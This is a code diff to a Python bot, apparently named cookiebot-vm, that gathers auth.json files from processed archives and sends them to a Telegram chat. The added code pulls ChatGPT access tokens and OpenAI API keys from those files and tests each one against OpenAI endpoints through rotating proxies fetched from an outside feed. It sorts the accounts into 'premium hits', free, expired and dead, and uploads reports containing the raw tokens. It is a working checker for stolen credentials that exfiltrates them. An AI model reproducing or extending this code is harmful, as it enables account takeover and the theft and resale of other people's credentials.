@@ -20,7 +20,7 @@ _flush = [0.0]
 
 RULE   = "━━━━━━━━━━━━━━━━━━━━━━━━━━"
 THIN   = "┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄"
-STAGE_ICON = {'boot': '🟡', 'idle': '🟢', 'installing': '🧩', 'download': '📥', 'downloaded': '✅', 'extract': '📦', 'extracted': '✅', 'wrong_password': '🔑', 'scan': '🔍', 'packed': '🗃', 'done': '🏁', 'error': '❌', 'cancelled': '🛑', 'cancelling': '🛑', 'queued': '⏳', 'retired': '♻️', 'ttl_expired': '♻️'}
+STAGE_ICON = {'boot': '🟡', 'idle': '🟢', 'installing': '🧩', 'download': '📥', 'downloaded': '✅', 'extract': '📦', 'extracted': '✅', 'wrong_password': '🔑', 'scan': '🔍', 'authcheck': '🔎', 'packed': '🗃', 'done': '🏁', 'error': '❌', 'cancelled': '🛑', 'cancelling': '🛑', 'queued': '⏳', 'retired': '♻️', 'ttl_expired': '♻️'}
 VM_TTL = 3600
 class _Ref:
     ref = 'rojaskomar67-ops/cookiebot-vm'
@@ -119,6 +119,17 @@ def stage_panel(p: dict) -> str:
         lines.append(f"🗂 {det}")
         if p.get("auth") is not None:
             lines.append(f"🔑 {code(p.get('auth'))} auth.json found")
+
+    if stage == "authcheck" and p.get("auth_total"):
+        tot_a = p.get("auth_total") or 1
+        done_a = p.get("checked", 0)
+        lines.append(f"🔑 {code('%d / %d' % (done_a, p.get('auth_total', 0)))}"
+                     f"  {bar(done_a * 100 // tot_a)}")
+        lines.append(f"✅ {code(p.get('live', 0))} live "
+                     f"(💰 {code(p.get('prem', 0))} premium · 🆓 {code(p.get('free', 0))})")
+        lines.append(f"⏳ {code(p.get('expired', 0))} expired   "
+                     f"❌ {code(p.get('dead', 0))} dead   "
+                     f"⚠️ {code(p.get('err', 0))} error   🌍 {code(p.get('proxies', 0))} proxies")
 
     if stage == "error" and p.get("err"):
         lines.append(f"⚠️ {bold('Error')}: {code(p.get('err'))}")
@@ -729,17 +740,240 @@ def deliver(packed, task):
     return sent, failed, links
 
 def deliver_auth(auths):
-    """Send auth.zip (1st_auth.json, 2nd_auth.json…) to the chat."""
+    """Send auth.zip (1st_auth.json, 2nd_auth.json…) to the chat.
+    Returns (sent, file_id) — the file id lets the bot re-download this exact
+    archive and run the proxy check on it after the job ends."""
     zp, rels = pack_auth(auths)
     if zp is None:
-        return False
+        return False, None
     shown = "\n".join(code("%s ← %s" % (n, r[:58])) for n, r in rels[:10])
     cap = (f"{gold_header('AUTH.JSON FILES', esc(str(len(auths)) + ' found'))}\n{THIN}\n"
            f"📦 {bold('Size')}   {code(fmt_size(zp.stat().st_size))}\n"
            f"🗂 {bold('Names')}  1st_auth.json, 2nd_auth.json …\n"
            + shown
            + ("\n…" if len(rels) > 10 else ""))
-    return upload(str(zp), cap)
+    if not TG or not CHAT:
+        return False, None
+    try:
+        with open(zp, "rb") as fh:
+            r = requests.post(TG_API + "sendDocument",
+                              data={"chat_id": CHAT, "caption": cap,
+                                    "parse_mode": "HTML"},
+                              files={"document": (zp.name, fh)}, timeout=300)
+        if r.status_code == 200:
+            fid = (((r.json().get("result") or {}).get("document") or {})
+                   .get("file_id"))
+            return True, fid
+        sys.stdout.write("tg send %s: %s\n" % (zp.name, r.text[:200]))
+        sys.stdout.flush()
+        return False, None
+    except Exception as e:
+        sys.stdout.write("tg send error: %s\n" % e); sys.stdout.flush()
+        return False, None
+
+# ── auth.json proxy check (did the user request it in step 4?) ─────────────
+AUTH_PROXY_URL   = "https://etherealproxyfetch.onrender.com/live.txt"
+AUTH_PREMIUM     = ("plus", "pro", "team", "enterprise", "go")
+
+def auth_fetch_proxies():
+    """Live proxy lines from the feed; [] means checks try the direct route."""
+    try:
+        r = requests.get(AUTH_PROXY_URL, timeout=30, headers={"User-Agent": "Mozilla/5.0"})
+        if r.status_code == 200:
+            out = []
+            for l in r.text.splitlines():
+                p = l.strip()
+                if not p or p.startswith("#"): continue
+                out.append(p if "://" in p else "http://" + p)
+            if out:
+                return out
+    except Exception as e:
+        sys.stdout.write("auth proxies: %s\n" % e); sys.stdout.flush()
+    return []
+
+def auth_jwt(tok):
+    import base64
+    try:
+        p = tok.split(".")[1]; p += "=" * (-len(p) % 4)
+        return json.loads(base64.urlsafe_b64decode(p).decode("utf-8"))
+    except Exception:
+        return {}
+
+def auth_check_one(rel, path, proxy):
+    res = {"name": rel, "status": "dead", "reason": "", "email": "-",
+           "plan": "-", "expires": "-", "proxy": proxy or "direct", "token": ""}
+    try:
+        data = json.load(open(path, encoding="utf-8-sig", errors="ignore"))
+    except Exception as e:
+        res["reason"] = "invalid json: %s" % str(e)[:40]; return res
+    if not isinstance(data, dict):
+        res["reason"] = "not a json object"; return res
+    tokens = data.get("tokens") if isinstance(data.get("tokens"), dict) else {}
+    access = tokens.get("access_token") or ""
+    idt = tokens.get("id_token") or ""
+    ak = data.get("OPENAI_API_KEY") or ""
+    px = ({"http": proxy, "https": proxy} if proxy else None)
+    H = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
+                       "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+         "Accept": "application/json"}
+    if not access and str(ak).startswith("sk-"):
+        res.update(token=ak, plan="API")
+        try:
+            r = requests.get("https://api.openai.com/v1/models",
+                             headers=dict(H, Authorization="Bearer " + ak),
+                             proxies=px, timeout=20)
+            res["reason"] = "HTTP %s" % r.status_code
+            res["status"] = ("api" if r.status_code == 200 else
+                             "dead" if r.status_code == 401 else "error")
+        except Exception as e:
+            res.update(status="error", reason="net: %s" % str(e)[:30])
+        return res
+    if not access or not idt:
+        res["reason"] = "missing access_token / id_token"; return res
+    res["token"] = access
+    payload = auth_jwt(idt)
+    res["email"] = payload.get("email", "Unknown")
+    ai = payload.get("https://api.openai.com/auth") or {}
+    res["plan"] = str(ai.get("chatgpt_plan_type", "Free") or "Free")
+    until = str(ai.get("chatgpt_subscription_active_until", "-") or "-")
+    if "T" in until: until = until.split("T")[0]
+    res["expires"] = until
+    exp = None
+    try: exp = float(auth_jwt(access).get("exp"))
+    except Exception: pass
+    if exp and exp < time.time():
+        res.update(status="expired",
+                   reason="jwt expired %s" % time.strftime("%Y-%m-%d", time.gmtime(exp)))
+        return res
+    try:
+        r = requests.get("https://chatgpt.com/backend-api/me",
+                         headers=dict(H, Authorization="Bearer " + access),
+                         proxies=px, timeout=25)
+        res["reason"] = "HTTP %s" % r.status_code
+        res["status"] = ("live" if r.status_code == 200 else
+                         "expired" if r.status_code == 401 else "error")
+    except Exception as e:
+        res.update(status="error", reason="net: %s" % str(e)[:30])
+    return res
+
+def check_auths(auths):
+    """Check every found auth.json (15 threads, live card). Writes the result
+    files, uploads auth_report.zip and returns ck_* counts for the payload."""
+    from concurrent.futures import ThreadPoolExecutor
+    total = len(auths)
+    tick("authcheck", 93, auth_total=total, checked=0, live=0, expired=0,
+         dead=0, err=0, proxies=0)
+    proxies = auth_fetch_proxies()
+    if stop():
+        return {}
+    results = []
+
+    def one(i):
+        rel, path = auths[i]
+        proxy = proxies[i % len(proxies)] if proxies else None
+        try:
+            return auth_check_one(rel, path, proxy)
+        except Exception as e:
+            return {"name": rel, "status": "error", "reason": "thread: %s" % e,
+                    "email": "-", "plan": "-", "expires": "-",
+                    "proxy": proxy or "direct", "token": ""}
+
+    with ThreadPoolExecutor(max_workers=min(15, max(1, total))) as ex:
+        for i, res in enumerate(ex.map(one, range(total))):
+            if stop():
+                return {}
+            results.append(res)
+            live_n = sum(1 for r in results if r["status"] in ("live", "api"))
+            expiry_n = sum(1 for r in results if r["status"] == "expired")
+            dead_n = sum(1 for r in results if r["status"] == "dead")
+            err_n = sum(1 for r in results if r["status"] == "error")
+            prem = sum(1 for r in results if r["status"] == "live"
+                       and r["plan"].lower() in AUTH_PREMIUM)
+            tick("authcheck", 93 + (i + 1) * 5 // max(total, 1),
+                 auth_total=total, checked=i + 1, live=live_n + prem,
+                 expired=expiry_n, dead=dead_n, err=err_n,
+                 prem=prem, free=live_n, proxies=len(proxies) or 1)
+
+    def aline(r):
+        return ("File: %s\nEmail: %s | Plan: %s | Exp: %s\n"
+                % (r["name"], r["email"], r["plan"], r["expires"])
+                + ("Token: %s\n" % r["token"] if r["token"] else "")
+                + ("Status: %s | %s\nProxy: %s\n%s\n"
+                   % (r["status"], r["reason"], r["proxy"], "-" * 48)))
+    prem_set = [r for r in results if r["status"] == "live"
+                and r["plan"].lower() in AUTH_PREMIUM]
+    free_set = [r for r in results if r["status"] in ("live", "api")
+                and r["plan"].lower() not in AUTH_PREMIUM]
+    exp_set  = [r for r in results if r["status"] == "expired"]
+    dead_set = [r for r in results if r["status"] == "dead"]
+    err_set  = [r for r in results if r["status"] == "error"]
+    live_set = prem_set + free_set
+
+    def wfile(name, rows, head=""):
+        with open(OUT / name, "w", encoding="utf-8") as f:
+            f.write(head)
+            for r in rows: f.write(aline(r))
+
+    wfile("results/premium_hits.txt", prem_set,
+          head=("==================================================\n   PREMIUM HITS\n"
+                "==================================================\n\n") if prem_set else "")
+    wfile("results/free_hits.txt", free_set)
+    wfile("results/expired.txt", exp_set)
+    wfile("results/dead.txt", dead_set)
+    wfile("results/errors.txt", err_set)
+    try:
+        with open(OUT / "results/all_results.json", "w", encoding="utf-8") as f:
+            json.dump(results, f, ensure_ascii=False)
+        with open(OUT / "results/proxies_used.txt", "w", encoding="utf-8") as f:
+            f.write("\n".join(proxies) + "\n")
+    except Exception as e:
+        sys.stdout.write("auth result files: %s\n" % e); sys.stdout.flush()
+
+    report = (
+        "==================================================\n   AUTH CHECKER REPORT\n"
+        "   %s\n" % time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime()) +
+        "==================================================\n\n"
+        "Total auth files     : %d\n" % total +
+        "Proxies loaded       : %d\n\n" % len(proxies) +
+        "Valid tokens         : %d\n" % len(live_set) +
+        "Expired tokens       : %d\n" % len(exp_set) +
+        "Dead / invalid       : %d\n" % len(dead_set) +
+        "Check errors         : %d\n\n" % len(err_set) +
+        "Live accounts        : %d (premium %d, free %d)\n"
+        % (len(live_set), len(prem_set), len(free_set)) +
+        "Dead accounts        : %d\n\n" % (len(dead_set) + len(exp_set)) +
+        "--- VALID ---\n" + ("".join(aline(r) for r in live_set) or "  none\n") +
+        ("--- EXPIRED ---\n%s" % "".join(aline(r) for r in exp_set) if exp_set else "") +
+        ("--- DEAD ---\n%s" % "".join(aline(r) for r in dead_set) if dead_set else "") +
+        ("--- ERRORS ---\n%s" % "".join(aline(r) for r in err_set) if err_set else ""))
+    zpath = OUT / "auth_report.zip"
+    try:
+        with zipfile.ZipFile(zpath, "w", zipfile.ZIP_DEFLATED) as z:
+            z.writestr("report.txt", report)
+            for rel, path in auths:
+                try: z.write(path, "source/" + rel.replace("\\", "_"))
+                except Exception: pass
+            for sub in ("premium_hits.txt", "free_hits.txt", "expired.txt",
+                        "dead.txt", "errors.txt", "all_results.json",
+                        "proxies_used.txt"):
+                p = OUT / "results" / sub
+                if p.exists(): z.write(p, "results/" + sub)
+        cap = (f"{gold_header('AUTH CHECK DONE', esc(str(len(results)) + ' files'))}\n{THIN}\n"
+               f"✅ {bold('Valid')}    {code(len(live_set))} "
+               f"(💰 {len(prem_set)} premium / 🆓 {len(free_set)} free)\n"
+               f"⏳ {bold('Expired')}  {code(len(exp_set))}   "
+               f"❌ {bold('Dead')} {code(len(dead_set))}\n"
+               f"⚠️ {bold('Errors')}   {code(len(err_set))}   "
+               f"🌍 {bold('Proxies')} {code(len(proxies))}")
+        okzip = upload(str(zpath), cap)
+    except Exception as e:
+        sys.stdout.write("auth zip: %s\n" % e); sys.stdout.flush()
+        okzip = False
+    return {"ck_total": len(results), "ck_live": len(live_set),
+            "ck_prem": len(prem_set), "ck_free": len(free_set),
+            "ck_exp": len(exp_set), "ck_dead": len(dead_set),
+            "ck_err": len(err_set), "ck_zip": bool(okzip),
+            "ck_proxies": len(proxies)}
 
 def finish(task, stage, **extra):
     """Terminal state for a job: paint the card, report to the bot, back to idle."""
@@ -749,7 +983,10 @@ def finish(task, stage, **extra):
     payload = {"job": task.get("job"), "stage": stage, "uid": task.get("chat")}
     payload.update({k: extra[k] for k in extra
                     if k in ("err", "found", "cookies", "tried", "sent", "failed",
-                             "links", "auth", "auth_sent")})
+                             "links", "auth", "auth_sent", "auth_fid",
+                             "ck_total", "ck_live", "ck_prem", "ck_free",
+                             "ck_exp", "ck_dead", "ck_err", "ck_zip",
+                             "ck_proxies")})
     payload["pubs"] = PB[3]
     report(payload)
     PB[1] = None
@@ -791,12 +1028,13 @@ def process(task):
         finish(task, "cancelled", err="cancelled"); return
     sent, failed, links = deliver(packed, task)
     want_auth = bool(task.get("auth"))
-    auth_sent = deliver_auth(auths) if want_auth else False
+    auth_sent, auth_fid = deliver_auth(auths) if want_auth else (False, None)
+    ck = check_auths(auths) if (want_auth and task.get("authcheck") and auths) else {}
     shutil.rmtree(WORK, ignore_errors=True)
     st("done", 100, job=task.get("job"), vm=SPECS)
     finish(task, "done", found=packed, cookies=sum(packed.values()), sent=sent,
            failed=failed, links=links, auth=len(auths) if want_auth else 0,
-           auth_sent=auth_sent)
+           auth_sent=auth_sent, auth_fid=auth_fid if want_auth else None, **ck)
 
 def main():
     OUT.mkdir(parents=True, exist_ok=True)
